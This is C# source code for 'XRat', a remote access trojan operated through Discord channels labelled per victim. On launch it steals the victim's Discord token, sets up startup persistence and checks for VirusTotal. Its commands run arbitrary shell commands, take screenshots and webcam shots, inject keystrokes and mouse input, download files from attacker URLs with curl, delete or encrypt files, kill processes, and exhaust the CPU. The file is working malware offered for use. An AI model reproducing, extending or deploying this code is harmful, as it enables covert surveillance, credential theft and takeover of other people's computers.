using Desktop.Robot;
using Desktop.Robot.Extensions;

using System.Drawing;

using Discord;
using Discord.Rest;
using Discord.WebSocket;
using XRat;
using System.Diagnostics;
using System.Windows.Forms;

class Program
{
    private Robot robot = new Robot();
    private DiscordSocketClient? client;
    private RestTextChannel? victimChannel;
    private Random Random = new Random();
    private long victimId;

    static void Main(string[] args)
        => new Program().MainAsync(args).GetAwaiter().GetResult();

    private async Task MainAsync(string[] args)
    {
        Utils.CheckVirusTotal();

        if (args.Length != 0)
        {
            foreach (string arg in args)
            {
                if (arg == "-settoken")
                {
                    Console.Write("Token: ");
                    string token_original = Console.ReadLine();

                    if (token_original == null)
                    { return; }

                    string encrypted_token = Settings.Base64Encode(token_original);
                    Console.WriteLine($"Encrypted token: {encrypted_token} | put this token to Settings.token");
                }
            }
        }

        if (Settings.debug)
        {
            Console.Title = "XRat";
            Console.WriteLine("XRat using Discord API for control victims");
        }

        var config = new DiscordSocketConfig
        {
            GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
        };

        client = new DiscordSocketClient(config);


        // EVENTS HANDLERS
        client.Log += Log;
        client.MessageReceived += CommandsHandler;
        client.Ready += CreateVictimChannel;
        // EVENTS HANDLERS


        // STATUS
        await client.SetStatusAsync(UserStatus.DoNotDisturb);
        await client.SetCustomStatusAsync("!help");
        // STATUS


        // START
        //string tkn = Settings.Base64Decode(Settings.token);

        await client.LoginAsync(TokenType.Bot, Settings.token);
        await client.StartAsync();
        // START

        if (Settings.debug)
        {
            Console.WriteLine("Bot is running...");
        }

        await Task.Delay(-1); // Keeps the bot running
    }

    private async Task CreateVictimChannel()
    {
        var guild = client.GetGuild(Settings.guildId);

        if (guild == null)
        {
            Console.WriteLine($"Guild not found with ID: {Settings.guildId}");
            return; // Прекращаем выполнение, если гильдия не найдена
        }

        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        if (logsChannel == null)
        {
            Console.WriteLine($"Channel not found with ID: {Settings.logsChannelID}");
            return; // Прекращаем выполнение, если канал не найден
        }

        await logsChannel.SendMessageAsync(Settings.startLog);

        var random = new Random();
        victimId = random.Next(100000000, 999999999);

        try
        {
            string username = Utils.ProCMD("whoami").output;
            username = username.Split('\\')[1];

            string victimname = string.Empty;
            victimChannel = await guild.CreateTextChannelAsync($"victim-{victimId}");
            await logsChannel.SendMessageAsync($"@everyone | New victim gotten: {victimId} | Username: {username}");
            await victimChannel.SendMessageAsync($"@everyone | All commands you will type here controlls only this victim | {victimId} | Username: {username}");

            await victimChannel.SendMessageAsync($"@everyone | Discord Token:\n{DiscordGrabber.GetToken()}");

            if (Settings.enable_startup)
            {
                string status = Utils.Startup();

                await victimChannel.SendMessageAsync($"@everyone | Startup status:\n{status}");
            }
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine($"Error creating channel: {e.Message}");
            }
        }
    }


    private async Task CommandsHandler(SocketMessage msg)
    {
        if (msg is not SocketUserMessage userMessage || userMessage.Author.IsBot) return;

        if (Settings.debug)
        {
            Console.WriteLine($"Received message: '{userMessage.Content}'");
        }

        string[] args = userMessage.Content.Split(' ');

        if (args.Length == 0 || !CheckPrefix(userMessage)) return;

        string command = args[0].ToLower();

        if (command == Settings.prefix + "help" && userMessage.Channel.Id == victimChannel.Id)
        {
            await HandleHelpCommand(userMessage);
        }

        if (command == Settings.prefix + "stop" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleStopCommand(userMessage);
        }

        if (command == Settings.prefix + "press" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandlePressCommand(userMessage, char.Parse(args[1]));
        }

        if (command == Settings.prefix + "type" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleTypeCommand(userMessage, args[1].ToString());
        }

        if (command == Settings.prefix + "click" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleClickCommand(userMessage);
        }

        if (command == Settings.prefix + "mouse" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleMouseCommand(userMessage, int.Parse(args[1]), int.Parse(args[2]));
        }

        if (command == Settings.prefix + "getmousepos" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleGetMousePosCommand(userMessage);
        }

        if (command == Settings.prefix + "web" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleWebCommand(userMessage, args[1]);
        }

        if (command == Settings.prefix + "screen" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleScreenCommand(userMessage, int.Parse(args[1]), int.Parse(args[2]));
        }

        if (command == Settings.prefix + "encrypt" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleEncryptCommand(userMessage, args[1]);
        }

        if (command == Settings.prefix + "decrypt" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleDecryptCommand(userMessage, args[1]);
        }

        if (command == Settings.prefix + "getprocesslist" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleGetProcessListCommand(userMessage);
        }

        if (command == Settings.prefix + "killprocess" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleKillProcess(userMessage, int.Parse(args[1]));
        }

        if (command == Settings.prefix + "filesystem" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleFileSystemCommand(userMessage, args[1], args[2]);
        }

        if (command == Settings.prefix + "msgbox" && userMessage.Channel.Id == victimChannel.Id) // If command in victim channel, control only this victim
        {
            await HandleMsgBoxCommand(userMessage, text: args[1].ToString(), caption: args[2].ToString());
        }

        if (command == Settings.prefix + "cmd" && userMessage.Channel.Id == victimChannel.Id)
        {
            await HandleCMDCommand(userMessage, args[1]);
        }

        //if (command == Settings.prefix + "control" && userMessage.Channel.Id == victimChannel.Id)
        //{
        //    await HandleControlCommand(userMessage, args[1]);
        //}

        if (command == Settings.prefix + "boot" && userMessage.Channel.Id == victimChannel.Id)
        {
            await HandleBootCommand(userMessage);
        }

        if (command == Settings.prefix + "reboot" && userMessage.Channel.Id == victimChannel.Id)
        {
            await HandleRebootCommand(userMessage);
        }

        if (command == Settings.prefix + "upload" && userMessage.Channel.Id == victimChannel.Id)
        {
            await HandleUploadCommand(userMessage, args[1], args[2]);
        }

        if (command == Settings.prefix + "destroy_pc" && userMessage.Channel.Id == victimChannel.Id)
        {
            await HandleDestroyPCCommand(userMessage);
        }

        //if (command == Settings.prefix + "!modinstall" && userMessage.Channel.Id == victimChannel.Id)
        //{
        //    await HandleModinstallCommand(userMessage, args[1]);
        //}

        if (command == Settings.prefix + "webcam" && userMessage.Channel.Id == victimChannel.Id)
        {
            await HandleWebCamCommand(userMessage);
        }
    }

    private async Task HandleHelpCommand(SocketUserMessage userMessage)
    {
        await userMessage.Channel.SendMessageAsync(@$"
{Settings.banner}
{userMessage.Author.Mention} | XRat by @.avirt
-------------------------------------------
Commands below works only in victim channel
-------------------------------------------
{Settings.prefix}help - Help Command
{Settings.prefix}mouse [x] [y]
{Settings.prefix}getmousepos
{Settings.prefix}click [button]
{Settings.prefix}press [button]
{Settings.prefix}type [text without spaces]
{Settings.prefix}web [link without spaces]
{Settings.prefix}screen [width] [height] [[Default is 1920x1080]] - Screenshot of victim's screen
{Settings.prefix}webcam - takes a webcam shot
{Settings.prefix}encrypt [path]
{Settings.prefix}decrypt [path]
{Settings.prefix}getprocesslist
{Settings.prefix}killprocess [pid]
{Settings.prefix}filesystem [action] [path]
{Settings.prefix}cmd [command]
{Settings.prefix}destroy_pc - Makes 160% of CPU
{Settings.prefix}upload [path] [url] - Uploads file to specific path
{Settings.prefix}msgbox [text] [caption] - show message box
{Settings.prefix}control [block] - Blocks Taskmgr
{Settings.prefix}boot - Shutdown the PC
{Settings.prefix}reboot - Restart the PC
{Settings.prefix}stop - Stop
");
    }

    private async Task HandleDestroyPCCommand(SocketUserMessage userMessage)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        Utils.DestroyPC();

        await logsChannel.SendMessageAsync($"Successfully destroyed victim '{victimId}' | By {userMessage.Author.Mention}");
        await victimChannel.SendMessageAsync($"Successfully destroyed victim '{victimId}' | By {userMessage.Author.Mention}");
    }

    private async Task HandleModinstallCommand(SocketUserMessage userMessage, string link)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        await Utils.ModuleLoader(link);

        await logsChannel.SendMessageAsync($"Successfully loaded module to victim '{victimId}' | By {userMessage.Author.Mention}");
        await victimChannel.SendMessageAsync($"Successfully loaded module to victim '{victimId}' | By {userMessage.Author.Mention}");
    }

    private async Task HandleUploadCommand(SocketUserMessage userMessage, string path, string url)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        bool status = Utils.CMD(@$"cd {path} && {{ curl -s -O {url} ; cd -; }}");

        await logsChannel.SendMessageAsync($"Successfully uploaded file to victim '{victimId}' | By {userMessage.Author.Mention}");
        await victimChannel.SendMessageAsync($"Successfully uploaded file to victim '{victimId}' | By {userMessage.Author.Mention}");
    }

    private async Task HandleBootCommand(SocketUserMessage userMessage)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);


        await logsChannel.SendMessageAsync($"Successfully booted victim '{victimId}' | By {userMessage.Author.Mention}");
        await victimChannel.SendMessageAsync($"booted victim '{victimId}' | By {userMessage.Author.Mention}");

        Utils.CMD("shutdown /s");
    }

    private async Task HandleRebootCommand(SocketUserMessage userMessage)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);


        await logsChannel.SendMessageAsync($"Successfully rebooted victim '{victimId}' | By {userMessage.Author.Mention}");
        await victimChannel.SendMessageAsync($"rebooted victim '{victimId}' | By {userMessage.Author.Mention}");

        Utils.CMD("shutdown /r");
    }

    private async Task HandleStopCommand(SocketUserMessage userMessage)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        await logsChannel.SendMessageAsync($"Successfully stoped victim '{victimId}' | By {userMessage.Author.Mention}");

        await victimChannel.DeleteAsync();
        Environment.Exit(-1);
    }

    //private async Task HandleControlCommand(SocketUserMessage userMessage, string access)
    //{
    //    var guild = client.GetGuild(Settings.guildId);
    //    var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
    //
    //    if (access == "block")
    //    {
    //        await Utils.Taskmgr();
    //        await logsChannel.SendMessageAsync($"Successfully blocked victim '{victimId}' | By {userMessage.Author.Mention}");
    //        await victimChannel.SendMessageAsync($"blocked victim '{victimId}' | By {userMessage.Author.Mention}");
    //    }
    //}

    private async Task HandleMsgBoxCommand(SocketUserMessage userMessage, string text, string caption)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        text = text.Replace('_', ' ');
        caption = caption.Replace('_', ' ');

        try
        {
            DialogResult result = MessageBox.Show(text: text, caption: caption, buttons: MessageBoxButtons.OKCancel);

            if (result == DialogResult.OK)
            {
                await victimChannel.SendMessageAsync($"Answer: OK  | '{victimId}' | {userMessage.Author.Mention}");
                await logsChannel.SendMessageAsync($"Successfully showed msgbox for victim '{victimId}' | {userMessage.Author.Mention}");
            }

            if (result == DialogResult.Cancel)
            {
                await victimChannel.SendMessageAsync($"Answer: Cancel | '{victimId}' | {userMessage.Author.Mention}");
                await logsChannel.SendMessageAsync($"Successfully showed msgbox for victim '{victimId}' | {userMessage.Author.Mention}");
            }

        }
        catch (Exception e)
        {
            await victimChannel.SendMessageAsync($"Failed to show msgbox for victim '{victimId}' | Error: {e.ToString()} | {userMessage.Author.Mention}");
            await logsChannel.SendMessageAsync($"Failed to show msgbox for victim '{victimId}' | Error: {e.ToString()} | {userMessage.Author.Mention}");
        }
    }

    private async Task HandleScreenCommand(SocketUserMessage userMessage, int width = 1920, int height = 1080)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        try
        {
            string file = $"screen{Random.Next(10000, 99999)}_{victimId}.jpg";
            using var bitmap = new Bitmap(width, height);
            using (var g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(0, 0, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);
            }
            bitmap.Save(file, System.Drawing.Imaging.ImageFormat.Jpeg);

            await victimChannel.SendFileAsync(file);

            File.Delete(file); // Then deleting screenshot

            await logsChannel.SendMessageAsync($"Successfully getted a screenshot of victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }

    private async Task HandleWebCamCommand(SocketUserMessage userMessage)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        try
        {
            string file = await Utils.WebCamAsync();

            await victimChannel.SendFileAsync(file);

            File.Delete(file); // Then deleting file

            await logsChannel.SendMessageAsync($"Successfully getted a webcam of victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }

    private async Task HandleEncryptCommand(SocketUserMessage userMessage, string path)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        try
        {
            File.Encrypt(path);

            await logsChannel.SendMessageAsync($"Successfully encrypted file | victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }

    private async Task HandleDecryptCommand(SocketUserMessage userMessage, string path)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        try
        {
            File.Decrypt(path);

            await logsChannel.SendMessageAsync($"Successfully encrypted file | victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }

    private async Task HandleGetProcessListCommand(SocketUserMessage userMessage)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        await victimChannel.SendMessageAsync("Getting processes...");

        try
        {
            foreach (Process process in Process.GetProcesses())
            {
                // отправляем id и имя процесса    
                await victimChannel.SendMessageAsync($"{userMessage.Author.Mention} | ID: {process.Id} Name: {process.ProcessName}");
            }

            await logsChannel.SendMessageAsync($"Successfully got the list of processes | victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }

    private async Task HandleKillProcess(SocketUserMessage userMessage, int pid)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        try
        {
            Process.GetProcessById(pid).Kill();

            await victimChannel.SendMessageAsync($"Successfully killed process | victim '{victimId}' | {userMessage.Author.Mention}");
            await logsChannel.SendMessageAsync($"Successfully killed process | victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e.ToString());
            }

            await victimChannel.SendMessageAsync($"Process not found! or Doesn't have acess! | victim '{victimId}' | {userMessage.Author.Mention}");
        }
    }

    private async Task HandleWebCommand(SocketUserMessage userMessage, string url)
    {
        var guild = client.GetGuild(Settings.guildId); // Получаем сервер по ID
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID); // Получаем канал для логов по ID


        if (File.Exists(Settings.browserPath))
        {
            await Process.Start(Settings.browserPath, url).WaitForExitAsync();

            await logsChannel.SendMessageAsync($"Successfully open {url} for victim by id: {victimId}");
        }
        else
        {
            await logsChannel.SendMessageAsync($"Error: 'msedge.exe' not found at {Settings.browserPath}");
        }
    }

    private async Task HandleFileSystemCommand(SocketUserMessage userMessage, string action, string path)
    {
        var guild = client.GetGuild(Settings.guildId); // Получаем сервер по ID
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID); // Получаем канал для логов по ID

        action = action.ToLower();

        if (File.Exists(path))
        {
            if (action == "delete")
            {
                File.Delete(path);
                await victimChannel.SendMessageAsync($"Deleted {path} | {victimId}");
            }

            await logsChannel.SendMessageAsync($"Successfully for victim by id: {victimId}");
        }
        else
        {
            await logsChannel.SendMessageAsync($"Error: path '{path}' is not found!");
        }
    }

    private async Task HandlePressCommand(SocketUserMessage userMessage, char key)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        try
        {
            robot.KeyPress(key);
            await logsChannel.SendMessageAsync($"Successfully sended key press victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e);
            }
        }
    }

    private async Task HandleClickCommand(SocketUserMessage userMessage)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        try
        {
            robot.Click();
            await logsChannel.SendMessageAsync($"Successfully sended click victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e);
            }
        }
    }

    private async Task HandleMouseCommand(SocketUserMessage userMessage, int x, int y)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        try
        {
            robot.MouseMove(new Point(x, y));
            await logsChannel.SendMessageAsync($"Successfully sended mouse move victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e);
            }
        }
    }

    private async Task HandleGetMousePosCommand(SocketUserMessage userMessage)
    {
        try
        {
            Point pos = robot.GetMousePosition();
            await victimChannel.SendMessageAsync($"Mouse Position for victim '{victimId}' is X: {pos.X} and Y: {pos.Y} | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e);
            }
        }
    }


    //private async Task HandleHotkeyCommand(SocketUserMessage userMessage)
    //{
    //    var guild = client.GetGuild(Settings.guildId);
    //    var logsChannel = guild.GetTextChannel(Settings.logsChannelID);
    //
    //    try
    //    {
    //        robot.CombineKeys([Key.K, Key.V]);
    //        await logsChannel.SendMessageAsync($"Successfully sended click victim '{victimId}' | {userMessage.Author.Mention}");
    //    }
    //    catch (Exception e)
    //    {
    //        Console.WriteLine(e);
    //    }
    //}

    private async Task HandleTypeCommand(SocketUserMessage userMessage, string text)
    {
        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        text = text.Replace('_', ' ');

        try
        {
            robot.Type(text);
            await logsChannel.SendMessageAsync($"Successfully sended text to type victim '{victimId}' | {userMessage.Author.Mention}");
        }
        catch (Exception e)
        {
            if (Settings.debug)
            {
                Console.WriteLine(e);
            }
        }
    }

    private async Task HandleCMDCommand(SocketUserMessage userMessage, string command)
    {
        // Get the victim's channel. Replace with your logic to obtain the correct channel.
        // Assuming victimId is the ID of the channel or the victim user.

        var guild = client.GetGuild(Settings.guildId);
        var logsChannel = guild.GetTextChannel(Settings.logsChannelID);

        command = command.Replace('_', ' ');

        try
        {
            // Start the CMD process with /min flag to run it minimized
            var processStartInfo = new ProcessStartInfo
            {
                FileName = "CMD.exe",
                Arguments = $"/min /C {command}",  // /min to minimize the CMD window, /C to execute and then terminate CMD
                RedirectStandardOutput = true, // Optionally capture output
                RedirectStandardError = true,  // Optionally capture errors
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = Process.Start(processStartInfo))
            {
                if (process == null)
                {
                    throw new InvalidOperationException("Failed to start CMD.exe process.");
                }

                // Wait for the process to exit asynchronously
                await process.WaitForExitAsync();

                // Optionally capture and log the output
                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();

                // If there is an error, send it to the victim channel
                if (!string.IsNullOrEmpty(error))
                {
                    if (Settings.debug)
                    {
                        // Debug mode: Send detailed logs to logs channel
                        await logsChannel.SendMessageAsync($"[DEBUG] Command failed: {command}\nError: {error}\n{userMessage.Author.Mention}");
                    }
                    else
                    {
                        // Send basic error message to victim channel
                        await victimChannel.SendMessageAsync($"Error executing command: {error}");
                    }
                }
                else
                {
                    // Send the result of the command to the victim channel
                    if (Settings.debug)
                    {
                        // Debug mode: Send detailed logs of the output
                        await logsChannel.SendMessageAsync($"[DEBUG] Command executed successfully: {command}\nOutput: {output}\n{userMessage.Author.Mention}");
                    }
                    else
                    {
                        // Send normal output to the victim channel
                        await victimChannel.SendMessageAsync($"Command output: {output}");
                    }
                }
            }
        }
        catch (Exception e)
        {
            // Capture any exception that might occur
            var errorMessage = $"Failed to send command to '{victimId}' | Error: {e.Message} | {userMessage.Author.Mention}";

            // Send the error message to the logs channel
            if (Settings.debug)
            {
                await logsChannel.SendMessageAsync($"[DEBUG] Exception occurred while processing the command: {e.ToString()}");
            }
            else
            {
                await logsChannel.SendMessageAsync(errorMessage);
            }

            // Also send a user-friendly error message back to the user
            await userMessage.Channel.SendMessageAsync(errorMessage);
        }
    }


    private bool CheckPrefix(SocketUserMessage userMessage)
    {
        return userMessage.Content.StartsWith(Settings.prefix);
    }

    private Task Log(LogMessage log)
    {
        if (Settings.debug)
        {
            Console.WriteLine(log);
        }
        return Task.CompletedTask;
    }
}